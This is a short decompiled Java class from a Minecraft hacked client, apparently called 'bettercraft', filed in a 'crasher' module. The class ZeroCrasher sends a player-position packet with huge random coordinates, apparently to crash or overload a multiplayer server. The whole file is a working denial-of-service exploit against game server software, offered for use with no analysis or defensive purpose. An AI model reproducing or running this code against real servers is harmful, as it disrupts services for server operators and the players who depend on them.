// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import me.amkgre.bettercraft.client.utils.RandomUtils;
import net.minecraft.client.Minecraft;

public class ZeroCrasher
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX + RandomUtils.getRandomUtils().getRandomInt(1000, Integer.MAX_VALUE), Minecraft.getMinecraft().player.posX + RandomUtils.getRandomUtils().getRandomInt(1000, Integer.MAX_VALUE), Minecraft.getMinecraft().player.posX + RandomUtils.getRandomUtils().getRandomInt(1000, Integer.MAX_VALUE), Minecraft.getMinecraft().player.onGround));
    }
}
